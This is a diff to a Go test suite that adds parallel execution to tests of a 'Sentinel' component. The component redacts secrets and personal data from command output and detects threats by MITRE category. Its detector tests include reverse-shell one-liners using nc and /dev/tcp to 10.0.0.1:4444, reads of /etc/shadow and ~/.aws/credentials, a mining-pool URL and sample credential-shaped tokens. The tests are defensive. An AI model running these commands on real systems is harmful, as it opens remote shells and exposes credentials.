@@ -27,6 +27,7 @@ import (
 )
 
 func TestDefaultSentinelConfig(t *testing.T) {
+	t.Parallel()
 	config := DefaultSentinelConfig()
 
 	assert.NotNil(t, config)
@@ -38,9 +39,11 @@ func TestDefaultSentinelConfig(t *testing.T) {
 }
 
 func TestNewSentinel(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 
 	t.Run("with nil config uses defaults", func(t *testing.T) {
+		t.Parallel()
 		sentinel := NewSentinel(nil, logger)
 		require.NotNil(t, sentinel)
 		assert.True(t, sentinel.config.Enabled)
@@ -49,6 +52,7 @@ func TestNewSentinel(t *testing.T) {
 	})
 
 	t.Run("with custom config", func(t *testing.T) {
+		t.Parallel()
 		config := &SentinelConfig{
 			Enabled:         true,
 			StrictMode:      false,
@@ -62,12 +66,14 @@ func TestNewSentinel(t *testing.T) {
 	})
 
 	t.Run("initializes scrubbers", func(t *testing.T) {
+		t.Parallel()
 		sentinel := NewSentinel(nil, logger)
 		assert.Greater(t, len(sentinel.scrubbers), 10, "should have many scrubbers")
 	})
 }
 
 func TestSentinel_ScrubText_IPv4_Preserved(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
@@ -90,6 +96,7 @@ func TestSentinel_ScrubText_IPv4_Preserved(t *testing.T) {
 }
 
 func TestSentinel_ScrubText_Email(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
@@ -110,6 +117,7 @@ func TestSentinel_ScrubText_Email(t *testing.T) {
 }
 
 func TestSentinel_ScrubText_UUID_Preserved(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
@@ -130,6 +138,7 @@ func TestSentinel_ScrubText_UUID_Preserved(t *testing.T) {
 }
 
 func TestSentinel_ScrubText_FilePaths_Preserved(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
@@ -151,6 +160,7 @@ func TestSentinel_ScrubText_FilePaths_Preserved(t *testing.T) {
 }
 
 func TestSentinel_ScrubText_Credentials(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
@@ -172,6 +182,7 @@ func TestSentinel_ScrubText_Credentials(t *testing.T) {
 }
 
 func TestSentinel_ScrubText_PII(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
@@ -188,6 +199,7 @@ func TestSentinel_ScrubText_PII(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
+		t.Parallel()
 			result := sentinel.ScrubText(tt.input)
 			assert.Contains(t, result, tt.contains)
 		})
@@ -195,6 +207,7 @@ func TestSentinel_ScrubText_PII(t *testing.T) {
 }
 
 func TestSentinel_ScrubText_AWSResources_Preserved(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
@@ -216,6 +229,7 @@ func TestSentinel_ScrubText_AWSResources_Preserved(t *testing.T) {
 }
 
 func TestSentinel_ScrubText_ConnectionStrings(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
@@ -238,6 +252,7 @@ func TestSentinel_ScrubText_ConnectionStrings(t *testing.T) {
 }
 
 func TestSentinel_ScrubText_PrivateKeys(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
@@ -252,6 +267,7 @@ MIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGy...
 }
 
 func TestSentinel_ScrubText_Disabled(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: false}
 	sentinel := NewSentinel(config, logger)
@@ -261,6 +277,7 @@ func TestSentinel_ScrubText_Disabled(t *testing.T) {
 }
 
 func TestSentinel_DetermineStatus(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
@@ -286,6 +303,7 @@ func TestSentinel_DetermineStatus(t *testing.T) {
 }
 
 func TestSentinel_CategorizeError(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
@@ -317,10 +335,12 @@ func TestSentinel_CategorizeError(t *testing.T) {
 }
 
 func TestSentinel_ScrubCommandResult(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
 	t.Run("successful command", func(t *testing.T) {
+		t.Parallel()
 		result := &CommandResult{
 			Command:    "SELECT * FROM users",
 			ExitCode:   0,
@@ -341,6 +361,7 @@ func TestSentinel_ScrubCommandResult(t *testing.T) {
 	})
 
 	t.Run("failed command", func(t *testing.T) {
+		t.Parallel()
 		result := &CommandResult{
 			Command:    "cat /etc/shadow",
 			ExitCode:   1,
@@ -357,6 +378,7 @@ func TestSentinel_ScrubCommandResult(t *testing.T) {
 	})
 
 	t.Run("command with warnings", func(t *testing.T) {
+		t.Parallel()
 		result := &CommandResult{
 			Command:    "npm install",
 			ExitCode:   0,
@@ -375,20 +397,24 @@ func TestSentinel_ScrubCommandResult(t *testing.T) {
 }
 
 func TestSentinel_ExtractStructureHints(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
 	t.Run("JSON object", func(t *testing.T) {
+		t.Parallel()
 		hints := sentinel.extractStructureHints(`{"key": "value"}`)
 		assert.Contains(t, hints, "format: json_object")
 	})
 
 	t.Run("JSON array", func(t *testing.T) {
+		t.Parallel()
 		hints := sentinel.extractStructureHints(`[1, 2, 3]`)
 		assert.Contains(t, hints, "format: json_array")
 	})
 
 	t.Run("tabular data with pipes", func(t *testing.T) {
+		t.Parallel()
 		hints := sentinel.extractStructureHints("id | name | email\n1 | John | j@x.com")
 		found := false
 		for _, h := range hints {
@@ -400,6 +426,7 @@ func TestSentinel_ExtractStructureHints(t *testing.T) {
 	})
 
 	t.Run("size categories", func(t *testing.T) {
+		t.Parallel()
 		tests := []struct {
 			size     int
 			expected string
@@ -420,15 +447,18 @@ func TestSentinel_ExtractStructureHints(t *testing.T) {
 }
 
 func TestSentinel_ExtractSafeMetrics(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
 	t.Run("row counts", func(t *testing.T) {
+		t.Parallel()
 		metrics := sentinel.ExtractSafeMetrics("Query returned 42 rows")
 		assert.Equal(t, 42, metrics["row_count"])
 	})
 
 	t.Run("multiple metrics", func(t *testing.T) {
+		t.Parallel()
 		output := "Processed 100 files, 5 errors, 10 warnings"
 		metrics := sentinel.ExtractSafeMetrics(output)
 		assert.Equal(t, 100, metrics["file_count"])
@@ -438,40 +468,47 @@ func TestSentinel_ExtractSafeMetrics(t *testing.T) {
 }
 
 func TestSentinel_ValidateNoLeakage(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
 	t.Run("clean text passes", func(t *testing.T) {
+		t.Parallel()
 		ok, violations := sentinel.ValidateNoLeakage("Status: success, 10 rows processed")
 		assert.True(t, ok)
 		assert.Empty(t, violations)
 	})
 
 	t.Run("IP address is allowed (preserved for troubleshooting)", func(t *testing.T) {
+		t.Parallel()
 		ok, violations := sentinel.ValidateNoLeakage("Server at 192.168.1.1")
 		assert.True(t, ok)
 		assert.Empty(t, violations)
 	})
 
 	t.Run("email detected", func(t *testing.T) {
+		t.Parallel()
 		ok, violations := sentinel.ValidateNoLeakage("Contact: user@example.com")
 		assert.False(t, ok)
 		assert.Contains(t, violations, "email")
 	})
 
 	t.Run("email placeholder is allowed", func(t *testing.T) {
+		t.Parallel()
 		ok, violations := sentinel.ValidateNoLeakage("Contact: [EMAIL]")
 		assert.True(t, ok)
 		assert.Empty(t, violations)
 	})
 
 	t.Run("UUID is allowed (preserved for troubleshooting)", func(t *testing.T) {
+		t.Parallel()
 		ok, violations := sentinel.ValidateNoLeakage("Resource 550e8400-e29b-41d4-a716-446655440000")
 		assert.True(t, ok)
 		assert.Empty(t, violations)
 	})
 
 	t.Run("private key detected", func(t *testing.T) {
+		t.Parallel()
 		ok, violations := sentinel.ValidateNoLeakage("-----BEGIN RSA PRIVATE KEY-----")
 		assert.False(t, ok)
 		assert.Contains(t, violations, "private_key")
@@ -479,9 +516,11 @@ func TestSentinel_ValidateNoLeakage(t *testing.T) {
 }
 
 func TestSentinel_ScrubMap(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 
 	t.Run("preserves IPs and scrubs emails in non-strict mode", func(t *testing.T) {
+		t.Parallel()
 		config := &SentinelConfig{Enabled: true, StrictMode: false}
 		sentinel := NewSentinel(config, logger)
 
@@ -498,6 +537,7 @@ func TestSentinel_ScrubMap(t *testing.T) {
 	})
 
 	t.Run("preserves IPs in nested maps in non-strict mode", func(t *testing.T) {
+		t.Parallel()
 		config := &SentinelConfig{Enabled: true, StrictMode: false}
 		sentinel := NewSentinel(config, logger)
 
@@ -515,6 +555,7 @@ func TestSentinel_ScrubMap(t *testing.T) {
 	})
 
 	t.Run("scrubs sensitive keys in strict mode", func(t *testing.T) {
+		t.Parallel()
 		sentinel := NewSentinel(nil, logger)
 
 		data := map[string]interface{}{
@@ -528,6 +569,7 @@ func TestSentinel_ScrubMap(t *testing.T) {
 }
 
 func TestSentinel_ScrubForCloudAI(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
@@ -550,15 +592,18 @@ func TestSentinel_ScrubForCloudAI(t *testing.T) {
 }
 
 func TestSentinel_IsEnabled(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 
 	t.Run("enabled config", func(t *testing.T) {
+		t.Parallel()
 		config := &SentinelConfig{Enabled: true}
 		sentinel := NewSentinel(config, logger)
 		assert.True(t, sentinel.IsEnabled())
 	})
 
 	t.Run("disabled config", func(t *testing.T) {
+		t.Parallel()
 		config := &SentinelConfig{Enabled: false}
 		sentinel := NewSentinel(config, logger)
 		assert.False(t, sentinel.IsEnabled())
@@ -566,6 +611,7 @@ func TestSentinel_IsEnabled(t *testing.T) {
 }
 
 func TestCountLines(t *testing.T) {
+	t.Parallel()
 	tests := []struct {
 		input    string
 		expected int
@@ -585,6 +631,7 @@ func TestCountLines(t *testing.T) {
 }
 
 func TestSentinel_CustomScrubPatterns(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{
 		Enabled:    true,
@@ -600,11 +647,13 @@ func TestSentinel_CustomScrubPatterns(t *testing.T) {
 }
 
 func TestSentinel_StrictModeDataRows(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: true}
 	sentinel := NewSentinel(config, logger)
 
 	t.Run("tabular data preserves structure but scrubs sensitive values", func(t *testing.T) {
+		t.Parallel()
 		input := "id\tname\temail\n1\tJohn\tjohn@test.com\n2\tJane\tjane@test.com"
 		result := sentinel.ScrubText(input)
 		// Structure preserved, but emails scrubbed
@@ -617,6 +666,7 @@ func TestSentinel_StrictModeDataRows(t *testing.T) {
 	})
 
 	t.Run("sensitive key-value pairs scrubbed", func(t *testing.T) {
+		t.Parallel()
 		input := "salary_info: 75000\nincome_data: 4430"
 		result := sentinel.ScrubText(input)
 		assert.Contains(t, result, "salary_info: [VALUE]")
@@ -624,6 +674,7 @@ func TestSentinel_StrictModeDataRows(t *testing.T) {
 	})
 
 	t.Run("non-sensitive key-value pairs preserved", func(t *testing.T) {
+		t.Parallel()
 		input := "Version: 24.0.7\nClient: Docker Engine"
 		result := sentinel.ScrubText(input)
 		assert.Contains(t, result, "Version: 24.0.7")
@@ -631,6 +682,7 @@ func TestSentinel_StrictModeDataRows(t *testing.T) {
 	})
 
 	t.Run("JSON data preserves structure but scrubs sensitive values", func(t *testing.T) {
+		t.Parallel()
 		input := `{"user": "admin", "email": "admin@test.com"}`
 		result := sentinel.ScrubText(input)
 		// Structure preserved, sensitive values scrubbed
@@ -640,11 +692,13 @@ func TestSentinel_StrictModeDataRows(t *testing.T) {
 }
 
 func TestSentinel_ScrubText_G8EAPIKey(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
 
 	t.Run("standalone key output", func(t *testing.T) {
+		t.Parallel()
 		input := "g8e_cm1241_0889f747327ff462500fba691894edbc415e81d145869757e9c2e75647defbf1"
 		result := sentinel.ScrubText(input)
 		assert.Contains(t, result, "[G8E_INTERNAL_API_KEY]")
@@ -652,6 +706,7 @@ func TestSentinel_ScrubText_G8EAPIKey(t *testing.T) {
 	})
 
 	t.Run("key embedded in text", func(t *testing.T) {
+		t.Parallel()
 		input := "Your key is g8e_test99_aabbccdd00112233445566778899aabbccddeeff00112233445566778899aabb end"
 		result := sentinel.ScrubText(input)
 		assert.Contains(t, result, "[G8E_INTERNAL_API_KEY]")
@@ -659,6 +714,7 @@ func TestSentinel_ScrubText_G8EAPIKey(t *testing.T) {
 	})
 
 	t.Run("key in env var echo", func(t *testing.T) {
+		t.Parallel()
 		input := "G8E_OPERATOR_API_KEY=g8e_op5_0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
 		result := sentinel.ScrubText(input)
 		assert.NotContains(t, result, "0123456789abcdef")
@@ -666,11 +722,13 @@ func TestSentinel_ScrubText_G8EAPIKey(t *testing.T) {
 }
 
 func TestSentinel_ScrubText_CloudCredentials(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
 
 	t.Run("AWS Access Key ID", func(t *testing.T) {
+		t.Parallel()
 		tests := []struct {
 			input    string
 			contains string
@@ -686,6 +744,7 @@ func TestSentinel_ScrubText_CloudCredentials(t *testing.T) {
 	})
 
 	t.Run("GCP API Key", func(t *testing.T) {
+		t.Parallel()
 		input := "gcp_key=AIzaSyDaGmWKa4JsXZ-HjGw7ISLn_3namBGewQe"
 		result := sentinel.ScrubText(input)
 		assert.Contains(t, result, "[GCP_API_KEY]")
@@ -693,6 +752,7 @@ func TestSentinel_ScrubText_CloudCredentials(t *testing.T) {
 	})
 
 	t.Run("Azure Secret in config", func(t *testing.T) {
+		t.Parallel()
 		input := `azure_client_secret="abc123def456ghi789jkl012mno345pqr678"`
 		result := sentinel.ScrubText(input)
 		assert.Contains(t, result, "[AZURE_SECRET]")
@@ -700,6 +760,7 @@ func TestSentinel_ScrubText_CloudCredentials(t *testing.T) {
 }
 
 func TestSentinel_ScrubText_JWT(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
@@ -711,11 +772,13 @@ func TestSentinel_ScrubText_JWT(t *testing.T) {
 }
 
 func TestSentinel_ScrubText_ServiceTokens(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
 
 	t.Run("GitHub Token", func(t *testing.T) {
+		t.Parallel()
 		tests := []string{
 			"ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx1234",
 			"gho_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx5678",
@@ -728,6 +791,7 @@ func TestSentinel_ScrubText_ServiceTokens(t *testing.T) {
 	})
 
 	t.Run("Slack Token", func(t *testing.T) {
+		t.Parallel()
 		tests := []string{
 			"xoxb-123456789012-1234567890123-AbCdEfGhIjKlMnOpQrStUvWx",
 			"xoxp-123456789012-1234567890123-AbCdEfGhIjKlMnOpQrStUvWx",
@@ -740,6 +804,7 @@ func TestSentinel_ScrubText_ServiceTokens(t *testing.T) {
 	})
 
 	t.Run("Okta API Token", func(t *testing.T) {
+		t.Parallel()
 		tests := []string{
 			"00abcDefGhIjKlMnOpQrStUvWxYz0123456789ABCD",
 			"00ABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890abc",
@@ -751,6 +816,7 @@ func TestSentinel_ScrubText_ServiceTokens(t *testing.T) {
 	})
 
 	t.Run("Azure AD Client Secret", func(t *testing.T) {
+		t.Parallel()
 		tests := []string{
 			"abc8Q~defghijklmnopqrstuvwxyz1234567890AB",
 			"Xyz12~ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
@@ -762,18 +828,21 @@ func TestSentinel_ScrubText_ServiceTokens(t *testing.T) {
 	})
 
 	t.Run("SendGrid Key", func(t *testing.T) {
+		t.Parallel()
 		input := "SG.xxxxxxxxxxxxxxxxxxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
 		result := sentinel.ScrubText(input)
 		assert.Contains(t, result, "[SENDGRID_KEY]")
 	})
 
 	t.Run("Twilio SID", func(t *testing.T) {
+		t.Parallel()
 		input := "Account SID: AC12345678901234567890123456789012"
 		result := sentinel.ScrubText(input)
 		assert.Contains(t, result, "[TWILIO_SID]")
 	})
 
 	t.Run("NPM Token", func(t *testing.T) {
+		t.Parallel()
 		input := "Using npm_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx for auth"
 		result := sentinel.ScrubText(input)
 		assert.Contains(t, result, "[NPM_TOKEN]")
@@ -781,6 +850,7 @@ func TestSentinel_ScrubText_ServiceTokens(t *testing.T) {
 }
 
 func TestSentinel_ScrubText_IBAN(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
@@ -796,6 +866,7 @@ func TestSentinel_ScrubText_IBAN(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
+		t.Parallel()
 			result := sentinel.ScrubText("Bank account: " + tt.input)
 			assert.Contains(t, result, "[IBAN]")
 			assert.NotContains(t, result, tt.input)
@@ -804,6 +875,7 @@ func TestSentinel_ScrubText_IBAN(t *testing.T) {
 }
 
 func TestSentinel_ScrubText_BearerToken(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
@@ -821,6 +893,7 @@ func TestSentinel_ScrubText_BearerToken(t *testing.T) {
 }
 
 func TestSentinel_ScrubText_OAuthSecret(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
@@ -842,20 +915,24 @@ func TestSentinel_ScrubText_OAuthSecret(t *testing.T) {
 // ===========================================
 
 func TestSentinel_SentinelEnabled(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 
 	t.Run("threat detection enabled by default", func(t *testing.T) {
+		t.Parallel()
 		config := DefaultSentinelConfig()
 		assert.True(t, config.SentinelEnabled)
 	})
 
 	t.Run("initializes threat detectors when enabled", func(t *testing.T) {
+		t.Parallel()
 		sentinel := NewSentinel(nil, logger)
 		assert.NotEmpty(t, sentinel.threatDetectors, "should have threat detectors")
 		assert.Greater(t, len(sentinel.threatDetectors), 20, "should have many threat detectors")
 	})
 
 	t.Run("no threat detectors when disabled", func(t *testing.T) {
+		t.Parallel()
 		config := &SentinelConfig{
 			Enabled:         true,
 			SentinelEnabled: false,
@@ -866,6 +943,7 @@ func TestSentinel_SentinelEnabled(t *testing.T) {
 }
 
 func TestSentinel_DetectThreats_ReverseShells(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
@@ -885,6 +963,7 @@ func TestSentinel_DetectThreats_ReverseShells(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
+		t.Parallel()
 			signals := sentinel.detectThreats(tt.input)
 			// Filter out signals from protocol doctrines to test only hardcoded detectors
 			var hardcodedSignals []ThreatSignal
@@ -906,6 +985,7 @@ func TestSentinel_DetectThreats_ReverseShells(t *testing.T) {
 }
 
 func TestSentinel_DetectThreats_PrivilegeEscalation(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
@@ -948,6 +1028,7 @@ func TestSentinel_DetectThreats_PrivilegeEscalation(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
+		t.Parallel()
 			signals := sentinel.detectThreats(tt.input)
 			if tt.shouldFind {
 				require.NotEmpty(t, signals)
@@ -966,6 +1047,7 @@ func TestSentinel_DetectThreats_PrivilegeEscalation(t *testing.T) {
 }
 
 func TestSentinel_DetectThreats_CredentialAccess(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
@@ -1013,6 +1095,7 @@ func TestSentinel_DetectThreats_CredentialAccess(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
+		t.Parallel()
 			signals := sentinel.detectThreats(tt.input)
 			if tt.shouldFind {
 				require.NotEmpty(t, signals)
@@ -1031,6 +1114,7 @@ func TestSentinel_DetectThreats_CredentialAccess(t *testing.T) {
 }
 
 func TestSentinel_DetectThreats_DataExfiltration(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
@@ -1068,6 +1152,7 @@ func TestSentinel_DetectThreats_DataExfiltration(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
+		t.Parallel()
 			signals := sentinel.detectThreats(tt.input)
 			if tt.shouldFind {
 				require.NotEmpty(t, signals)
@@ -1086,6 +1171,7 @@ func TestSentinel_DetectThreats_DataExfiltration(t *testing.T) {
 }
 
 func TestSentinel_DetectThreats_Cryptominer(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
@@ -1123,6 +1209,7 @@ func TestSentinel_DetectThreats_Cryptominer(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
+		t.Parallel()
 			signals := sentinel.detectThreats(tt.input)
 			if tt.shouldFind {
 				require.NotEmpty(t, signals)
@@ -1140,6 +1227,7 @@ func TestSentinel_DetectThreats_Cryptominer(t *testing.T) {
 }
 
 func TestSentinel_DetectThreats_Persistence(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
@@ -1182,6 +1270,7 @@ func TestSentinel_DetectThreats_Persistence(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
+		t.Parallel()
 			signals := sentinel.detectThreats(tt.input)
 			if tt.shouldFind {
 				require.NotEmpty(t, signals)
@@ -1198,6 +1287,7 @@ func TestSentinel_DetectThreats_Persistence(t *testing.T) {
 }
 
 func TestSentinel_DetectThreats_DefenseEvasion(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
@@ -1250,6 +1340,7 @@ func TestSentinel_DetectThreats_DefenseEvasion(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
+		t.Parallel()
 			signals := sentinel.detectThreats(tt.input)
 			if tt.shouldFind {
 				require.NotEmpty(t, signals, "should find threat in: %s", tt.input)
@@ -1259,6 +1350,7 @@ func TestSentinel_DetectThreats_DefenseEvasion(t *testing.T) {
 }
 
 func TestSentinel_DetectThreats_Reconnaissance(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
@@ -1291,6 +1383,7 @@ func TestSentinel_DetectThreats_Reconnaissance(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
+		t.Parallel()
 			signals := sentinel.detectThreats(tt.input)
 			if tt.shouldFind {
 				require.NotEmpty(t, signals)
@@ -1307,15 +1400,18 @@ func TestSentinel_DetectThreats_Reconnaissance(t *testing.T) {
 }
 
 func TestSentinel_AggregateThreatLevel(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
 	t.Run("no signals returns none", func(t *testing.T) {
+		t.Parallel()
 		level := sentinel.aggregateThreatLevel(nil)
 		assert.Equal(t, ThreatLevelNone, level)
 	})
 
 	t.Run("critical signal returns critical", func(t *testing.T) {
+		t.Parallel()
 		signals := []ThreatSignal{
 			{Severity: ThreatSeverityCritical},
 		}
@@ -1324,6 +1420,7 @@ func TestSentinel_AggregateThreatLevel(t *testing.T) {
 	})
 
 	t.Run("high signal returns high", func(t *testing.T) {
+		t.Parallel()
 		signals := []ThreatSignal{
 			{Severity: ThreatSeverityHigh},
 		}
@@ -1332,6 +1429,7 @@ func TestSentinel_AggregateThreatLevel(t *testing.T) {
 	})
 
 	t.Run("medium signal returns elevated", func(t *testing.T) {
+		t.Parallel()
 		signals := []ThreatSignal{
 			{Severity: ThreatSeverityMedium},
 		}
@@ -1340,6 +1438,7 @@ func TestSentinel_AggregateThreatLevel(t *testing.T) {
 	})
 
 	t.Run("multiple low signals returns elevated", func(t *testing.T) {
+		t.Parallel()
 		signals := []ThreatSignal{
 			{Severity: ThreatSeverityLow},
 			{Severity: ThreatSeverityLow},
@@ -1350,6 +1449,7 @@ func TestSentinel_AggregateThreatLevel(t *testing.T) {
 	})
 
 	t.Run("single low signal returns low", func(t *testing.T) {
+		t.Parallel()
 		signals := []ThreatSignal{
 			{Severity: ThreatSeverityLow},
 		}
@@ -1358,6 +1458,7 @@ func TestSentinel_AggregateThreatLevel(t *testing.T) {
 	})
 
 	t.Run("critical overrides all", func(t *testing.T) {
+		t.Parallel()
 		signals := []ThreatSignal{
 			{Severity: ThreatSeverityLow},
 			{Severity: ThreatSeverityMedium},
@@ -1370,10 +1471,12 @@ func TestSentinel_AggregateThreatLevel(t *testing.T) {
 }
 
 func TestSentinel_ScrubCommandResult_WithThreatDetection(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
 	t.Run("detects threats in command", func(t *testing.T) {
+		t.Parallel()
 		result := &CommandResult{
 			Command:    "nc 10.0.0.1 4444 -e /bin/bash",
 			ExitCode:   0,
@@ -1390,6 +1493,7 @@ func TestSentinel_ScrubCommandResult_WithThreatDetection(t *testing.T) {
 	})
 
 	t.Run("detects threats in stdout", func(t *testing.T) {
+		t.Parallel()
 		result := &CommandResult{
 			Command:    "ps aux",
 			ExitCode:   0,
@@ -1411,6 +1515,7 @@ func TestSentinel_ScrubCommandResult_WithThreatDetection(t *testing.T) {
 	})
 
 	t.Run("no threats in clean command", func(t *testing.T) {
+		t.Parallel()
 		result := &CommandResult{
 			Command:    "ls -la",
 			ExitCode:   0,
@@ -1432,6 +1537,7 @@ func TestSentinel_ScrubCommandResult_WithThreatDetection(t *testing.T) {
 	})
 
 	t.Run("multiple threat categories detected", func(t *testing.T) {
+		t.Parallel()
 		result := &CommandResult{
 			Command:    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
 			ExitCode:   0,
@@ -1447,6 +1553,7 @@ func TestSentinel_ScrubCommandResult_WithThreatDetection(t *testing.T) {
 	})
 
 	t.Run("threat detection disabled", func(t *testing.T) {
+		t.Parallel()
 		config := &SentinelConfig{
 			Enabled:         true,
 			SentinelEnabled: false,
@@ -1469,10 +1576,12 @@ func TestSentinel_ScrubCommandResult_WithThreatDetection(t *testing.T) {
 }
 
 func TestSentinel_ThreatSignal_MITREMapping(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
 	t.Run("reverse shell has correct MITRE mapping", func(t *testing.T) {
+		t.Parallel()
 		signals := sentinel.detectThreats("bash -i >& /dev/tcp/10.0.0.1/4444")
 		require.NotEmpty(t, signals)
 		assert.Equal(t, "T1059.004", signals[0].MitreAttack)
@@ -1480,6 +1589,7 @@ func TestSentinel_ThreatSignal_MITREMapping(t *testing.T) {
 	})
 
 	t.Run("cryptominer has correct MITRE mapping", func(t *testing.T) {
+		t.Parallel()
 		signals := sentinel.detectThreats("stratum+tcp://pool.minergate.com")
 		require.NotEmpty(t, signals)
 		assert.Equal(t, "T1496", signals[0].MitreAttack)
@@ -1487,6 +1597,7 @@ func TestSentinel_ThreatSignal_MITREMapping(t *testing.T) {
 	})
 
 	t.Run("credential access has correct MITRE mapping", func(t *testing.T) {
+		t.Parallel()
 		signals := sentinel.detectThreats("cat ~/.aws/credentials")
 		require.NotEmpty(t, signals)
 		assert.Equal(t, "T1552.001", signals[0].MitreAttack)
@@ -1495,10 +1606,12 @@ func TestSentinel_ThreatSignal_MITREMapping(t *testing.T) {
 }
 
